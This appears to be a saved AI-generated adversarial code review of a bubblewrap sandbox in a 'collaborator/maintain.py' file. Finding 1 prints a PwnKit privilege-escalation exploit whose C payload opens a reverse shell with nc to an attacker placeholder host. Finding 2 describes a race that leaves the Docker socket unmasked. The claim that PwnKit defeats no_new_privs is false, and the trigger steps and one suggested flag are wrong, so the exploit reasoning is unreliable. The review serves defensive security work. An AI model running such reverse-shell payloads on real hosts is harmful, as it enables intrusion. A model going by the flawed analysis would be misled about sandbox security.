# deputy-seal code panel: google/gemini-2.5-pro

_finish=stop seconds=122.7 cost=$0.1541 usage={'prompt_tokens': 27111, 'completion_tokens': 12019, 'total_tokens': 39130, 'cost': 0.15407875, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 0, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.15407875, 'upstream_inference_prompt_cost': 0.03388875, 'upstream_inference_completions_cost': 0.12019}, 'completion_tokens_details': {'reasoning_tokens': 9821, 'image_tokens': 0, 'audio_tokens': 0}}_

Excellent. This is a well-designed sandbox with multiple layers of defense, but the requirement for full filesystem reach creates an attack surface that can be exploited. The `setuid` vector, as hinted, is indeed the key to a full bypass.

Here is the adversarial code review.

***

### FINDING 1: `setuid-root` Binary Execution via Full Filesystem Bind Defeats Sandbox

*   **ID:** 1
*   **TITLE:** `setuid-root` Binary Execution via Full Filesystem Bind Defeats Sandbox
*   **SEVERITY:** CRITICAL
*   **LOCATION:**
    *   `collaborator/maintain.py:186`: `--bind / /`
    *   `collaborator/maintain.py:196` (and surrounding `_bwrap_argv`): Lack of `--clearenv`
*   **CONCRETE BYPASS:**
    The sandbox's core defense against un-removable masks is the lack of `CAP_SYS_ADMIN`, which rests on `bwrap` dropping capabilities and setting the `no_new_privs` process attribute. However, the combination of `--bind / /` (which does not apply `nosuid`) and the failure to clear the environment (`--clearenv` is missing, unlike in `contained.py`) allows a payload to execute a vulnerable `setuid-root` binary on the host to gain full root privileges, breaking all sandbox guarantees.

    A concrete example is exploiting an older, vulnerable version of `pkexec` (the "PwnKit" vulnerability, CVE-2021-4034).

    1.  The payload inside the sandbox creates a malicious library, `pwn.c`:
        ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <unistd.h>
        void gconv() {}
        void gconv_init() {
          setuid(0); setgid(0); seteuid(0); setgid(0);
          system("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> > /tmp/f");
          exit(0);
        }
        ```
    2.  It compiles this with `gcc -o pwn.so -shared -fPIC pwn.c`.
    3.  It creates a directory `GCONV_PATH=.` and a file `gconv-modules` containing `module UTF-8// PWN// pwn 2`.
    4.  It executes `pkexec` with a crafted environment: `GCONV_PATH=. CHARSET=PWN pkexec`.

    Because the environment is inherited, the payload can set `GCONV_PATH` and `CHARSET` to trigger the PwnKit vulnerability in `pkexec`. This bypasses `no_new_privs` by exploiting a logic bug in `pkexec` before `execve` is ever called, gaining a full `uid=0` root shell on the host. From there, it can access any deputy socket, access the network directly, and disable any system controls.

*   **WHY IT BREAKS THE SEAL:**
    This is a total sandbox escape to host root. It completely negates the socket masking (the attacker is now real root and can `umount` them or just use them) and the network isolation (the attacker can enable host network interfaces or use any networking tool). The `network_isolated` flag becomes a lie.

*   **WHETHER ANOTHER CONTROL CATCHES IT:**
    No. This attack bypasses the sandbox mechanism itself. The `CapEff`/`CapPrm` check in the guard is irrelevant because the exploit gains privileges via a separate `setuid` binary, not by raising capabilities in the sandboxed process.

*   **FIX:**
    The "full filesystem reach" requirement is fundamentally at odds with robust sandboxing.
    1.  **Best Fix (Violates Requirement):** Do not use `--bind / /`. Instead, bind only the necessary system directories (`/usr`, `/bin`, etc.) read-only and the workspace read-write, as the `contained.py` sandbox does. This is the only way to truly prevent access to arbitrary `setuid` binaries.
    2.  **Pragmatic Mitigation:** Add `--clearenv` to `maintain.py:_bwrap_argv` at line 196. This would have mitigated the specific PwnKit vector and many other environment-based attacks against `setuid` programs.
    3.  **Advanced Fix:** Use a more complex `bwrap` sequence to remount the root filesystem with the `nosuid` flag inside the sandbox. This is non-trivial but would directly defang all `setuid` binaries while preserving the file view. Example: `bwrap ... --bind / / --remount-nosuid / ...` (Note: `bwrap` does not have a simple `--remount-nosuid` flag; this would require more complex layering).

---

### FINDING 2: TOCTOU Race Allows Unmasked Access to Deputy Sockets

*   **ID:** 2
*   **TITLE:** TOCTOU Race Allows Unmasked Access to Deputy Sockets
*   **SEVERITY:** HIGH
*   **LOCATION:** `collaborator/maintain.py:211`: `deputies = _present_deputy_sockets()`
*   **CONCRETE BYPASS:**
    The `wrap_maintenance` function determines which deputy sockets to mask by calling `_present_deputy_sockets()` *before* constructing and executing the `bwrap` command. This creates a time-of-check-to-time-of-use (TOCTOU) race condition. An attacker can ensure a deputy daemon (e.g., Docker) is not running when the Python code checks, but starts it just before `subprocess.run` is called.

    1.  Attacker ensures `docker.service` is stopped.
    2.  The `run_command` is initiated. `wrap_maintenance` calls `_present_deputy_sockets()`. `/var/run/docker.sock` does not exist, so it is not added to the `deputies` list for masking.
    3.  The attacker, in a concurrent process, starts the Docker daemon: `systemctl start docker`. `/var/run/docker.sock` is created.
    4.  `_exec_command` calls `run_supervised`, which executes the `bwrap` command.
    5.  The sandbox starts. The `--bind / /` makes `/var/run/docker.sock` visible. Since it was not on the `deputies` list, no `--ro-bind` mask was applied over it.
    6.  The guard script runs. It checks the masks for the (empty) list of deputies it was given, passes, and emits `SALIENT_MAINT_VERIFIED`.
    7.  The payload executes and can now connect to `/var/run/docker.sock` to pull an image or run a container with network access, bypassing the sandbox's network isolation.

*   **WHY IT BREAKS THE SEAL OR THE FLAG'S HONESTY:**
    This breaks the deputy seal. The `network_isolated` flag will be `True` because the guard passed and emitted its token, but the payload can achieve network egress via the unmasked deputy socket. The flag lies.

*   **WHETHER ANOTHER CONTROL CATCHES IT:**
    No. The guard (`_guarded_script`) only verifies that the sockets *it was told to mask* are masked. It has no knowledge of sockets that might have appeared after the initial check.

*   **FIX:**
    This race is difficult to close completely without kernel support. The best mitigation is to change the guard's logic:
    1.  Pass the *entire* list of potential `_DEPUTY_SOCKETS` to the guard script, not just the ones present at check time.
    2.  Modify `_guarded_script` to iterate through this full list. For each path, it must verify: `if [ -e "$d" ]; then [ -c "$d" ] || fail; fi`.
    3.  This logic, running *inside* the sandbox just before `exec`, ensures that if any deputy socket exists at execution time, it must be a character device (i.e., masked). This closes the race window.

---

### STEELMAN & VERDICT

*   **STEELMAN:**
    The author has correctly identified that `CAP_SYS_ADMIN` is the primary threat to mount-based masking and has used the correct `bwrap` features (`--cap-drop ALL`, `--disable-userns`) to neutralize it for the sandboxed process. The in-child guard, which verifies that capabilities are *actually* zero, is an excellent example of "verify, don't trust." The fallback to the existing `netns` wrapper is honest, and the positive-token whitelist (`verified_ok`) is a robust way to prevent fail-open conditions and ensure the `network_isolated` flag is trustworthy *if the sandbox premises hold*. The documented residuals (blocklist, async laundering) show a clear understanding of the threat model's boundaries.

*   **VERDICT: SERIOUS_FLAWS**
    Despite its robust design, the sandbox contains a critical flaw stemming from its core requirement to provide full, read-write filesystem access. This allows for a `setuid` binary exploit that leads to a complete sandbox escape and host compromise. A second, high-severity race condition also allows the deputy seal to be bypassed under concurrent activity.

    **Highest-value fix:** **Immediately add `--clearenv` to the `bwrap` arguments in `maintain.py`** to mitigate a broad class of `setuid` exploits (like PwnKit), and begin the difficult conversation about replacing `--bind / /` with a more restrictive set of bind mounts, as this is the root cause of the critical vulnerability.
